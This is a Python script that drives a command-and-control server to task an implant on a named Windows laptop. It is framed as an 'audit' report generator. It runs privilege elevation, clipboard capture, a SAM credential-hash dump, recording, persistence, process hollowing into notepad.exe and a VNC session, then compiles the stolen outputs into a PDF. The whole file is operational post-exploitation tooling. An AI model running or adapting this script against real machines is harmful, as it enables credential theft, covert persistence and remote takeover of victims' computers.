import requests
import time
import json
import os
from fpdf import FPDF

BASE_URL = "http://127.0.0.1:5001"
AGENT_ID = "LAPTOP-33MRE1H7_73789895"
REPORT_NAME = f"ADVANCED_Audit_Report_Windows_{int(time.time())}.pdf"

def log(msg):
    print(f"[*] {msg}")

class PDF(FPDF):
    def header(self):
        self.set_font('Helvetica', 'B', 15)
        self.cell(0, 10, 'UNIVERSAL C2 - ADVANCED TACTICAL AUDIT', 0, 1, 'C')
        self.ln(5)

    def footer(self):
        self.set_y(-15)
        self.set_font('Helvetica', 'I', 8)
        self.cell(0, 10, f'Page {self.page_no()}', 0, 0, 'C')

def generate_pdf(results_map):
    pdf = PDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    pdf.add_page()
    
    # Metadata
    pdf.set_font("Helvetica", "B", 12)
    pdf.cell(0, 10, f"Target: LAPTOP-33MRE1H7", ln=True)
    pdf.cell(0, 10, f"Agent ID: {AGENT_ID}", ln=True)
    pdf.cell(0, 10, f"Audit Type: ADVANCED POST-EXPLOITATION", ln=True)
    pdf.ln(10)
    
    for cmd, output in results_map.items():
        pdf.set_font("Helvetica", "B", 14)
        pdf.set_text_color(153, 0, 0) # Dark Red for advanced ops
        pdf.cell(0, 10, f"ADVANCED OP: {cmd}", ln=True)
        pdf.set_text_color(0, 0, 0)
        pdf.set_font("Courier", "", 8)
        
        try:
            clean_out = output.encode('latin-1', 'replace').decode('latin-1')
        except:
            clean_out = "[!] Output contains binary or incompatible encoding."
            
        pdf.multi_cell(0, 4, clean_out, border=0)
        pdf.ln(5)
        pdf.line(10, pdf.get_y(), 200, pdf.get_y())
        pdf.ln(5)
        
    pdf.output(REPORT_NAME)
    return REPORT_NAME

def run_advanced_audit():
    s = requests.Session()
    s.post(f"{BASE_URL}/login", data={"password": "admin"})

    # 1. Attempt Elevation
    log("Attempting Elevation (@elevate)...")
    s.post(f"{BASE_URL}/admin/task", json={"agent_id": AGENT_ID, "command": "@elevate"})
    time.sleep(10) # Give it time to spawn new process

    results_map = {}
    
    # 2. Sequential Advanced Operations
    advanced_ops = [
        "@privcheck",
        "@clipboard",
        "@sam",
        "@record_start",
        "WAIT:5",
        "@record_stop",
        "@persist",
        "@hollow notepad.exe",
        "@vnc_start",
        "WAIT:5",
        "@vnc_stop"
    ]
    
    for op in advanced_ops:
        if op.startswith("WAIT:"):
            seconds = int(op.split(":")[1])
            log(f"  [WAIT] Sleeping for {seconds}s...")
            time.sleep(seconds)
            continue

        log(f"Initiating: {op}")
        resp = s.post(f"{BASE_URL}/admin/task", json={"agent_id": AGENT_ID, "command": op})
        task_id = resp.json().get("task_id")
        
        found = False
        timeout = 60
        start_time = time.time()
        while time.time() - start_time < timeout:
            time.sleep(3)
            res_data = s.get(f"{BASE_URL}/admin/results", params={"agent_id": AGENT_ID}).json()
            for r in reversed(res_data):
                if r.get("task_id") == task_id:
                    results_map[op] = r.get("output")
                    found = True
                    break
            if found: break
            
        if not found:
            results_map[op] = "[!] Operation timed out."
            log(f"  [!] Timeout for {op}")
        else:
            log(f"  [+] Received output for {op}")
            
    # 3. Generate Report
    log("Compiling ADVANCED PDF Report...")
    path = generate_pdf(results_map)
    log(f"SUCCESS: Advanced report generated at {path}")
    print(f"\n[REPORT_PATH] {os.path.abspath(path)}")

if __name__ == "__main__":
    run_advanced_audit()
